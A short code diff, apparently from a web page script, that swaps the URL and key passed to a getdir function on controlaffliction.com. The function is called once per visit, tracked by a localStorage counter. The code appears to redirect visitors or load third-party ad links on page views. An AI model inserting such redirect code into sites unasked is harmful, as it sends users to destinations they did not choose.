@@ -1,13 +1,13 @@
  if(!localStorage['akutampan']){
-    getdir('https://controlaffliction.com/ew1s259c18?key=399e2a353837e0e99ade0ad3b18c101f','satu');
+    getdir('https://controlaffliction.com/wsem8vs9?key=4379572b053007114f9fcb98715be7d1','satu');
   }
 
   if(localStorage['akutampan']=='satu')
   {
-     getdir('https://controlaffliction.com/ew1s259c18?key=399e2a353837e0e99ade0ad3b18c101f','dua');
+     getdir('https://controlaffliction.com/wsem8vs9?key=4379572b053007114f9fcb98715be7d1','dua');
   }else if(localStorage['akutampan']=='dua')
   {
-    getdir('https://controlaffliction.com/ew1s259c18?key=399e2a353837e0e99ade0ad3b18c101f','tiga');
+    getdir('https://controlaffliction.com/wsem8vs9?key=4379572b053007114f9fcb98715be7d1','tiga');
   }
 
 
